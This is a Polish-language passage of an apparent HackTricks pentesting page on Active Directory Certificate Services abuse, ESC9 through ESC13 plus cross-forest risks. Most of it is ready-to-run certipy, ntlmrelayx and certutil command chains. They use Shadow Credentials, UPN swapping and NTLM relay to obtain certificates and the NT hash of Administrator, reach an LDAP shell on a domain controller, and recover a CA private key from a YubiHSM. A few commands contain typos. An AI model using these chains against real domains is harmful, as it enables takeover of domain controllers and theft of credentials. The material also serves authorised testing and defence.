Nowa wartość **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) dla **`msPKI-Enrollment-Flag`**, określana jako ESC9, zapobiega osadzaniu **nowego `szOID_NTDS_CA_SECURITY_EXT` rozszerzenia zabezpieczeń** w certyfikacie. Flaga ta staje się istotna, gdy `StrongCertificateBindingEnforcement` jest ustawione na `1` (domyślne ustawienie), co kontrastuje z ustawieniem `2`. Jej znaczenie wzrasta w scenariuszach, w których słabsze mapowanie certyfikatów dla Kerberos lub Schannel może być wykorzystane (jak w ESC10), biorąc pod uwagę, że brak ESC9 nie zmieniłby wymagań.

Warunki, w których ustawienie tej flagi staje się istotne, obejmują:

* `StrongCertificateBindingEnforcement` nie jest dostosowane do `2` (z domyślnym ustawieniem `1`), lub `CertificateMappingMethods` zawiera flagę `UPN`.
* Certyfikat jest oznaczony flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.
* Jakiekolwiek EKU uwierzytelniania klienta jest określone przez certyfikat.
* Uprawnienia `GenericWrite` są dostępne dla dowolnego konta, aby skompromitować inne.

### Abuse Scenario

Załóżmy, że `John@corp.local` ma uprawnienia `GenericWrite` do `Jane@corp.local`, z celem skompromitowania `Administrator@corp.local`. Szablon certyfikatu `ESC9`, do którego `Jane@corp.local` ma prawo się zarejestrować, jest skonfigurowany z flagą `CT_FLAG_NO_SECURITY_EXTENSION` w swoim ustawieniu `msPKI-Enrollment-Flag`.

Początkowo, hash `Jane` jest pozyskiwany za pomocą Shadow Credentials, dzięki `GenericWrite` `Johna`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Następnie `userPrincipalName` `Jane` jest modyfikowany na `Administrator`, celowo pomijając część domeny `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ta modyfikacja nie narusza ograniczeń, ponieważ `Administrator@corp.local` pozostaje odrębny jako `userPrincipalName` `Administratora`.

Po tym, szablon certyfikatu `ESC9`, oznaczony jako podatny, jest żądany jako `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Zauważono, że `userPrincipalName` certyfikatu odzwierciedla `Administrator`, pozbawiony jakiegokolwiek “object SID”.

`userPrincipalName` `Jane` jest następnie przywracany do jej oryginalnego, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Próba uwierzytelnienia za pomocą wydanego certyfikatu teraz zwraca hasz NT `Administrator@corp.local`. Polecenie musi zawierać `-domain <domain>` z powodu braku specyfikacji domeny w certyfikacie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Słabe mapowania certyfikatów - ESC10

### Wyjaśnienie

Dwie wartości kluczy rejestru na kontrolerze domeny są określane przez ESC10:

* Wartość domyślna dla `CertificateMappingMethods` w `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` to `0x18` (`0x8 | 0x10`), wcześniej ustawiona na `0x1F`.
* Domyślne ustawienie dla `StrongCertificateBindingEnforcement` w `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` to `1`, wcześniej `0`.

**Przypadek 1**

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`.

**Przypadek 2**

Jeśli `CertificateMappingMethods` zawiera bit `UPN` (`0x4`).

### Przypadek nadużycia 1

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`, konto A z uprawnieniami `GenericWrite` może zostać wykorzystane do skompromitowania dowolnego konta B.

Na przykład, mając uprawnienia `GenericWrite` do `Jane@corp.local`, atakujący dąży do skompromitowania `Administrator@corp.local`. Procedura odzwierciedla ESC9, umożliwiając wykorzystanie dowolnego szablonu certyfikatu.

Początkowo, hash `Jane` jest pozyskiwany za pomocą Shadow Credentials, wykorzystując `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Następnie `userPrincipalName` `Jane` jest zmieniany na `Administrator`, celowo pomijając część `@corp.local`, aby uniknąć naruszenia ograniczenia.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Następnie żądany jest certyfikat umożliwiający uwierzytelnianie klienta jako `Jane`, przy użyciu domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` jest następnie przywracany do pierwotnej wersji, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Uwierzytelnienie za pomocą uzyskanego certyfikatu da NT hash `Administrator@corp.local`, co wymaga określenia domeny w poleceniu z powodu braku szczegółów domeny w certyfikacie.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

Z flagiem bitowym `UPN` w `CertificateMappingMethods` (`0x4`), konto A z uprawnieniami `GenericWrite` może skompromitować każde konto B, które nie ma właściwości `userPrincipalName`, w tym konta maszynowe oraz wbudowanego administratora domeny `Administrator`.

Celem jest skompromitowanie `DC$@corp.local`, zaczynając od uzyskania hasha `Jane` za pomocą Shadow Credentials, wykorzystując `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'s `userPrincipalName` jest następnie ustawiony na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Certyfikat do uwierzytelniania klienta jest żądany jako `Jane` przy użyciu domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` jest przywracany do pierwotnej wersji po tym procesie.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Aby uwierzytelnić się za pomocą Schannel, używana jest opcja `-ldap-shell` Certipy, która wskazuje na pomyślne uwierzytelnienie jako `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Poprzez powłokę LDAP, polecenia takie jak `set_rbcd` umożliwiają ataki oparte na delegacji ograniczonej zasobami (RBCD), co może zagrozić kontrolerowi domeny.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ta luka dotyczy również każdego konta użytkownika, które nie ma `userPrincipalName` lub gdy nie pasuje do `sAMAccountName`, przy czym domyślne `Administrator@corp.local` jest głównym celem z powodu swoich podwyższonych uprawnień LDAP i braku `userPrincipalName` domyślnie.

## Relaying NTLM to ICPR - ESC11

### Wyjaśnienie

Jeśli serwer CA nie jest skonfigurowany z `IF_ENFORCEENCRYPTICERTREQUEST`, może to prowadzić do ataków NTLM relay bez podpisywania za pośrednictwem usługi RPC. [Referencja tutaj](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Możesz użyć `certipy`, aby sprawdzić, czy `Enforce Encryption for Requests` jest wyłączone, a certipy pokaże luki `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenariusz nadużycia

Należy skonfigurować serwer przekaźnikowy:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Note: Dla kontrolerów domeny musimy określić `-template` w DomainController.

Lub używając [forka sploutchy'ego impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Administratorzy mogą skonfigurować Urząd Certyfikacji, aby przechowywał go na zewnętrznym urządzeniu, takim jak "Yubico YubiHSM2".

Jeśli urządzenie USB jest podłączone do serwera CA przez port USB, lub serwer urządzenia USB w przypadku, gdy serwer CA jest maszyną wirtualną, wymagany jest klucz uwierzytelniający (czasami nazywany "hasłem"), aby Dostawca Przechowywania Kluczy mógł generować i wykorzystywać klucze w YubiHSM.

Ten klucz/hasło jest przechowywane w rejestrze pod `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` w postaci niezaszyfrowanej.

Referencja [tutaj](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Jeśli prywatny klucz CA jest przechowywany na fizycznym urządzeniu USB, gdy uzyskasz dostęp do powłoki, możliwe jest odzyskanie klucza.

Najpierw musisz uzyskać certyfikat CA (to jest publiczne), a następnie:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.

## OID Group Link Abuse - ESC13

### Explanation

Atrybut `msPKI-Certificate-Policy` pozwala na dodanie polityki wydania do szablonu certyfikatu. Obiekty `msPKI-Enterprise-Oid`, które są odpowiedzialne za wydawanie polityk, można odkryć w Kontekst Nazewniczy Konfiguracji (CN=OID,CN=Public Key Services,CN=Services) kontenera PKI OID. Polityka może być powiązana z grupą AD za pomocą atrybutu `msDS-OIDToGroupLink` tego obiektu, co umożliwia systemowi autoryzację użytkownika, który przedstawia certyfikat, tak jakby był członkiem grupy. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

Znajdź uprawnienia użytkownika, które można wykorzystać `certipy find` lub `Certify.exe find /showAllPermissions`.

Jeśli `John` ma uprawnienia do rejestracji `VulnerableTemplate`, użytkownik może dziedziczyć uprawnienia grupy `VulnerableGroup`.

Wszystko, co musi zrobić, to określić szablon, a otrzyma certyfikat z prawami OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Kompromitacja Lasów z Certyfikatami Wyjaśniona w Stronie Biernej

### Łamanie Zaufania Lasów przez Kompromitowane CA

Konfiguracja dla **cross-forest enrollment** jest stosunkowo prosta. **Certyfikat CA root** z lasu zasobów jest **publikowany do lasów kontowych** przez administratorów, a **certyfikaty CA enterprise** z lasu zasobów są **dodawane do kontenerów `NTAuthCertificates` i AIA w każdym lesie kontowym**. Aby wyjaśnić, to ustawienie przyznaje **CA w lesie zasobów pełną kontrolę** nad wszystkimi innymi lasami, dla których zarządza PKI. Jeśli to CA zostanie **skompromentowane przez atakujących**, certyfikaty dla wszystkich użytkowników w obu lasach, zasobów i kontowych, mogą być **fałszowane przez nich**, łamiąc w ten sposób granicę bezpieczeństwa lasu.

### Uprawnienia do Rejestracji Przyznane Obcym Podmiotom

W środowiskach wielolasowych należy zachować ostrożność w odniesieniu do CA Enterprise, które **publikują szablony certyfikatów**, które pozwalają **Użytkownikom Uwierzytelnionym lub obcym podmiotom** (użytkownikom/grupom zewnętrznym do lasu, do którego należy CA Enterprise) **na prawa rejestracji i edycji**.\
Po uwierzytelnieniu w ramach zaufania, **SID Użytkowników Uwierzytelnionych** jest dodawany do tokena użytkownika przez AD. Tak więc, jeśli domena posiada CA Enterprise z szablonem, który **pozwala Użytkownikom Uwierzytelnionym na prawa rejestracji**, szablon może potencjalnie być **zarejestrowany przez użytkownika z innego lasu**. Podobnie, jeśli **prawa rejestracji są wyraźnie przyznawane obcemu podmiotowi przez szablon**, **tworzy to relację kontroli dostępu między lasami**, umożliwiając podmiotowi z jednego lasu **rejestrację w szablonie z innego lasu**.

Oba scenariusze prowadzą do **zwiększenia powierzchni ataku** z jednego lasu do drugiego. Ustawienia szablonu certyfikatu mogą być wykorzystane przez atakującego do uzyskania dodatkowych uprawnień w obcej domenie.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
